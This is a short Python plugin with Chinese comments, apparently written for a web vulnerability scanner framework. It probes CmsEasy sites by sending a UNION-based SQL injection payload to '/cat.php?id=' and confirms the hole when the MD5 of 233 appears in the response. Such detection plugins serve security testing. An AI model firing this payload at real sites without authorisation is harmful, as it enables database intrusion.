#!/usr/bin/env python
# -*- coding: utf-8 -*-
# __author__ = 'snRNA'
# 引入需要用到的标准库
import urllib

# assign 验证任务的指纹
def assign(service, arg):
    service  == fingerprint.cmseasy    # 指纹需要上线提交，采用已有的指纹跳过验证  
    if service == fingerprint.cmseasy: # 指纹为 cmseasy  
        return True, arg  # 返回类型为 tuple

# audit 审计函数，通过指纹验证后调用该函数
def audit(arg):
    # 此插件中 arg 为提交的网址
    # 构造要提交数据的目标 URL
    target = arg + '/cat.php?id='
    payload = "2%20UNION%20SELECT%201,md5(233),3,4%20from%20information_schema.tables"
    # 空格等特殊字符要进行url编码,方可有效
    target = target + payload
    # 通过 hackhttp 发送 Payload 到目标
    code, head, body, redirect_url, log = hackhttp.http(
        target)  #也可以发送post阿虎踞
    #print body
    # 验证是否存在漏洞
    if 'e165421110ba03099a1c0393373c5b43' in body:  #233的md5值
        # 存在漏洞则输出目标 URL
        #print "test"
        security_hole(target, log=log)

# 本地测试时需要加 main 用于调用
if __name__ == '__main__':
    # 导入 sdk
    from dummy import *
    # 调用 audit 与 assign
    audit(assign(fingerprint.cmseasy, 'http://localhost')[1])
